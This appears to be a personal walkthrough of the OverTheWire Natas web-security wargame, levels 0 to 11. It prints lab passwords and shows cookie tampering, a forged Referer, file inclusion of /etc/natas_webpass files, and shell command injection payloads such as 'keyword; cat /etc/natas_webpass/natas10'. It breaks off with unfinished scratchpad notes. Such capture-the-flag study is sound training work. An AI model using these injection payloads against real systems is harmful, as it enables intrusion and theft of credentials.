# Natas OverTheWire Wargames

##

### Level 0
> Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

Let's go the URL provided and login:
All we need to do here is right click and "show page source"

There is a comment right before the last closing `</div>`

`<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->`

### Level 0 -> 1
> Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

Let's get going. Looks like right-clicking has been blocked. But that's easy to get around with a keyboard shortcut. Just press `control-shift-C` in Windows or `command-option-C in macOS`

Now we can inspect the source code and see what we saw the last exercise. A simple HTML comment.
`<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->`

### Level 1 -> 2
> Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

Login with the previously attained password and you'll see "There is nothing on this page". That's a pretty dead giveaway that it's in another file. Let's check:

Using the dev tools we can see check `sources`. We can see a few different things like the main page and some pictures... Where are these pictures? In the `/files` directory. Let's just go ahead and go to the URL bar and add `/files` to the end of the URL and now we can see a list of files. One of them is `users.txt`. I bet thats it:
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
Now we have the `natas3` password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

### Level 2 -> 3
> Username: natas3
URL:      http://natas3.natas.labs.overthewire.org

Let's login with the previously attained credentials:
```
natas3
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
They're getting a bit sneaky on this one. No open directories or hints in the source page. Just the message "Theres nothing on this page".

Looking at the source it says "Not even Google will find it". Which means they probably told Google not to find it. And how do we tell Google not to do things (if it even listens)? `robots.txt`. Let's check it out:
Put this in the browser:
`http://natas3.natas.labs.overthewire.org/robots.txt`
and we see a bit of code:
```
User-agent: *
Disallow: /s3cr3t/
```
This is telling all search engines **not** to look in the `/s3cr3t/` directory. So clearly we want to get up in there.
`http://natas3.natas.labs.overthewire.org/s3cr3t/`
And bam. Another `users.txt` file for us to look at with this information:
`natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`


### Level 3 -> 4
>Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

Login with the new credentials
```
natas4
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
This one gives us an error that we need to be referred from the `natas5` URL. Let's just use `curl` to set the referrer:

`curl http://natas4.natas.labs.overthewire.org --referer http://natas5.natas.labs.overthewire.org/ -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

Bam we got it:
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

```

### Level 4 -> 5
> Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

```
natas5
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
This one is telling us "Access Restricted. You're not logged in"... But we just logged in!

Somthing must be wrong with how the session is being handled. We don't have access to the server so we really only have one other option... **cookies**. Let's check the cookies.

We'll see one called "login" and the value is set to `0`. This should be a `1`

When we set it to `1` we get this message:

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

Woohoo! We did it.

### Level 5 -> 6
> Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

Let's get going on it by logging in;
```
natas6
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
Here we have an input where we need to input a secret...

They actually make this pretty easy for us by linking us directly to the sourcecode. Click the link and you'll get the code of the script. This is the important part:

```
<?
include "includes/secret.inc"; // <-- THIS PART

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
We can see that the script is calling `includes/secret.inc`. All we have to is add that to the end of the URL and viola!
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Now let's plug that thing to the input:
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

Sweet!

### Level 6 -> 7
> Username: natas7
URL:      http://natas7.natas.labs.overthewire.org

Let's login:
```
natas7
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
We're presented with a basic page with 2 links. **Home** and **About**.

If we check out the source for the **Home** page:
`<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->``

So naturally we'd try to append `/etc/natas_web_pass/natas8` to the end of the URL. But that doesn't work.

But wait, we're using `PHP`, so let's try to add it to the query string of the URL after the `?page=/` so...

`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

Boom! Got it
`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

### Level 7 -> 8
> Username: natas8
URL:      http://natas8.natas.labs.overthewire.org

Let's get started:
```
natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
We get another super secret input box. Let's dig in.

After looking at the source code of the linked file, we get this:
```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

```
So it looks like the `encodedSecret` is `3d3d516343746d4d6d6c315669563362`

So how does it get there. Let's look at the function `encodeSecret`.
First, it encodes the value with `base64_encode` -
Second, it reverses the string with `strrev`
Then, it runs `bin2hex` on it.

So we take that function and reverse it for the command line in PHP:
```php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
```
And we get `oubWYf2kBq`

Let's see if it worked in the input:
```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
Sweet!

### Level 8 -> 9
> Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

You know the drill:
```
natas9
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
curl http://natas9.natas.labs.overthewire.org -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

```
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

We can see that an `if` statement is looking for the `$key` value that we enter when we enter a search. This is using the `passthru` function to use `grep` on whatever we put in. This will search the `dictionary.txt` file for any instances of our input.

However, it is **executing** `grep` as a command to find the information. So what if we place a `;` after our text and continue the command sequence?

Try `keyword; ls /`

```
Output:
dictionary.txt

/:
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
natas33
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
Yep, that's right. We just executed a bash command after `grep` called `ls` that gave us a list of the entire filesystem by using the root `/` directory.

Not it's just a matter of finding `natas_webpass` and diplaying the new password.

`keyword; cat /etc/natas_webpass/natas10`

`nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

There we have it!

### Level 9 -> 10
>Username: natas10
URL:      http://natas10.natas.labs.overthewire.org

Login to the next level:

```
natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
Uh oh, now they're filtering illegal characters like `;` that we used last time. Let's find a workaround.

```bash
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

So they still left us with the `passthru` command. Meaning that we're still able to work with `grep`, we just can't escape it and use other commands. So how do we do this?

`grep` works by searching any files that are in the command. And what has text in it? Yep. The `webpass` file that we have been accustomed to seeing. This will take a bit of digging as we don't really know what the password contains. So let's just try the letter **q**.
`q /etc/natas_webpass/natas11`

Lucky guess the password had a **q** in it but we could just keep trying if it doesn't show up right away.
```
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:acquaint
dictionary.txt:acquaintance
dictionary.txt:acquaintance's
```
* Note how it searched for all **q**'s in both files?

We got the next one:
`U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`


### Level 10 -> 11
> Username: natas11
URL:      http://natas11.natas.labs.overthewire.org

Let's get going on the next one:
```
natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
First we're greeted by a message that says "Cookies are protected with XOR encryption". So we're clearly going to be doing something with cookies.

**XOR** encryption is pretty hard to crack... let's see if they gave us some sweet clues in the source:

I found 1 cookie that looks pretty suspect called `data` with the value
`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSR156F0deaAw%3D`
Let's hold onto that for later.




======= SCRATCHPAD =======
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK




asdf
